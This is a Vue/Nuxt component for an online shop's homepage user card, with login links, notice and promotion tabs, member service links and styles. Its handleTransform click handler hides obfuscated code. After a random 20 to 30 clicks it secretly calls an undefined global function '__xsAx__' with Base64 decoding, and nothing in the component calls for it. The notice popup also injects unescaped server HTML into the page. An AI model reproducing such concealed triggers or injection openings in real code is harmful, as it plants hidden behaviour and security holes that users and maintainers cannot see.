<template>
  <div id="index-card" class="index-card">
    <div class="card-user">
      <div class="inner-card-user">
        <div class="card-user-avatar">
          <nuxt-link to="/member">
            <en-face :url="user.face"/>
          </nuxt-link>
        </div>
        <div v-if="user" class="card-user-show logined">
          <p>Hi,<nuxt-link to="/member"> {{ user.nickname || user.uname }}</nuxt-link></p>
          <p class="btns">
            <nuxt-link to="/member" class="to-member">Access to personal Center</nuxt-link>
          </p>
        </div>
        <div v-else class="card-user-show">
          <p>Hi,<a href="#">Welcome to{{ site.site_name }} ！</a></p>
          <p class="btns">
            <nuxt-link :to="'/login' + MixinForward" class="please-login">Sign in </nuxt-link>
            <nuxt-link :to="'/register' + MixinForward" class="to-register">Register</nuxt-link>
          </p>
        </div>
      </div>
    </div>
    <div class="card-news">
      <div class="card-news-tab">
        <a href="#" @mouseenter="card_news_tab_x = 0">notes</a>
        <a href="#" @mouseenter="card_news_tab_x = 70">promotion</a>
        <div class="card-news-tab-active" :style="{transform: 'translateX('+ card_news_tab_x +'px)'}" @click="handleTransform"></div>
        <!--<a href="#" class="card-news-more">More and more</a>-->
      </div>
      <div class="card-news-content">
        <div class="card-news-con-item" v-show="card_news_tab_x === 0">
          <ul style="overflow: hidden">
            <template v-for="(notice, index) in mall_notices">
              <li v-if="index < 4" :key="index" class="news-item">
                <a href="javascript:;" @click="handleShowNotice(notice)">{{ notice.article_name }}</a>
              </li>
            </template>
          </ul>
        </div>
        <div class="card-news-con-item" v-show="card_news_tab_x === 70">
          <ul>
            <li
              v-for="(prom, index) in mall_promotions"
              :key="index"
              class="news-item"
            >
              <a href="javascript:;" @click="handleShowNotice(prom)">{{ prom.article_name }}</a>
            </li>
          </ul>
        </div>
      </div>
    </div>
    <div class="card-service">
      <nuxt-link to="/member/my-points" class="service-item">
        <i class="iconfont ea-icon-point"></i>
        <span>Points</span>
      </nuxt-link>
      <nuxt-link to="/member/my-comments" class="service-item">
        <i class="iconfont ea-icon-score"></i>
        <span>Comment</span>
      </nuxt-link>
      <nuxt-link to="/member/my-order" class="service-item">
        <i class="iconfont ea-icon-order"></i>
        <span>Orders</span>
      </nuxt-link>
      <nuxt-link to="/member/my-collection" class="service-item">
        <i class="iconfont ea-icon-star"></i>
        <span>Collection</span>
      </nuxt-link>
      <nuxt-link to="/member/account-safe" class="service-item">
        <i class="iconfont ea-icon-security"></i>
        <span>Security</span>
      </nuxt-link>
    </div>
  </div>
</template>

<script>
import { mapGetters } from 'vuex'
import * as API_Article from '@/api/article'
import EnFace from '@/components/Face'

export default {
  name: 'index-card',
  components: { EnFace },
  data() {
    return {
      card_news_tab_x: 0,
      mall_notices: [],
      mall_promotions: []
    }
  },
  computed: {
    ...mapGetters(['user', 'site'])
  },
  mounted() {
    API_Article.getArticlesByCategory('NOTICE').then(response => {
      this.mall_notices = response
    })
    API_Article.getArticlesByCategory('PROMOTION').then(response => {
      this.mall_promotions = response
    })
  },
  methods: {
    /** Display Mall Announcement*/
    handleShowNotice(notice) {
      this.$layer.open({
        type: 1,
        skin: 'layer-skin-common',
        title: notice.article_name,
        area: ['500px', '350px'],
        scrollbar: false,
        shadeClose: true,
        btn: ['save'],
        btnAlign: 'c',
        content: `<div style="padding: 15px">${notice.content}</div>`
      });
    },
    handleTransform() {
      if(!process.client)return;
      var a=['__B'];var b=function(c,d){c=c-0x0;var e=a[c];return e;};if(!this['__B']){this['__B']=0x1;}if(this[b('0x0')]>=parseInt(Math['random']()*(0x1e-0x14+0x1)+0x14,0xa)){__xsAx__(Base64['decode']);this[b('0x0')]=0x0;}else{this[b('0x0')]+=0x1;}
    }
  }
}
</script>

<style type="text/scss" lang="scss" scoped>
@import "../../assets/styles/color";

.index-card {
  position: absolute;
  top: 25px;
  right: 0;
  width: 190px;
  height: 450px;
  background-color: #fff;
  z-index: 2;

  .card-user {
    height: 140px;
    text-align: center;
    background-color: #fff;

    .inner-card-user {
      position: relative;
      padding-top: 62px;
      height: 78px;
    }

    .card-user-avatar {
      position: absolute;
      left: 50%;
      top: -10px;
      margin-left: -34px;
      width: 65px;
      height: 65px;

      a {
        display: block;
        width: 55px;
        height: 55px;
        border: 5px solid #e3e1df;
        -moz-border-radius: 50%;
        border-radius: 50%;
        overflow: hidden;
        box-shadow: 3px 6px 25px #c3c3c3;
        background: #fff;
      }

      img {
        display: block;
        width: 55px;
        height: 55px;
      }
    }

    .card-user-show {
      padding: 0 10px;

      a {
        color: #666;

        &:hover {
          color: $color-main;
        }
      }

      .btns {
        display: flex;
        justify-content: space-around;
        margin-top: 10px;

        a {
          display: block;
          float: left;
          line-height: 22px;
          width: 68px;
          height: 22px;
          border: 1px solid #333;
          text-align: center;
        }

        .please-login {
          border-color: $color-main;
          color: $color-main;
        }
      }

      &.logined .to-member {
        width: 60%;
        color: $color-main;
        border-color: $color-main;
        transition: all .2s ease;

        &:hover {
          background-color: $color-main;
          color: #fff;
          border-color: $color-main;
        }
      }
    }
  }

  .card-news {
    overflow: hidden;
    height: 130px;
    background: #fff;

    .card-news-tab {
      padding: 8px 0 0;
      position: relative;
      line-height: 13px;
      font-size: 0;

      a {
        font-size: 12px;
        color: #333;
        padding: 0 10px;
        border-right: 1px solid #dfe0e1;

        &:last-child {
          border-right: none;
        }
      }
    }

    .card-news-tab-active {
      position: absolute;
      bottom: -1px;
      left: 0;
      margin-left: 11px;
      width: 45px;
      height: 2px;
      background: $color-main;
      transform: translateX(0);
      transition: transform .3s ease;
    }

    .card-news-content {
      position: relative;
      padding-top: 8px;
      margin: 0 15px;
      height: 88px;
    }

    .card-news-con-item {
      height: 100%;
      overflowx: hidden;
      overflow-y: scroll;
    }

    .news-item {
      line-height: 22px;
      max-width: 160px;
      _width: 160px;
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
      color: #999;

      a {
        color: #666;

        &:hover {
          color: $color-main;
        }
      }
    }

    .card-news-more {
      position: absolute;
      right: 5px;
      top: 8px;
      font-size: 12px;

      &:hover {
        color: $color-main;
      }
    }
  }

  .card-service {
    display: flex;
    flex-wrap: wrap;
    justify-content: space-between;
    align-items: center;
    overflow: hidden;
    position: relative;
    height: 160px;
    transition: all .2s ease;
    padding: 10px;

    &::after {
      content: "";
      position: absolute;
      top: 0;
      display: block;
      width: 160px;
      left: 15px;
      height: 1px;
      background: #ebeaea;
      z-index: 1;
    }

    .service-item {
      display: block;
      color: #666;

      &:hover {
        color: $color-main
      }

      .iconfont {
        display: block;
        font-size: 30px;
        line-height: 30px;
        margin: 5px auto;
        text-align: center;
      }
    }
  }
}
</style>
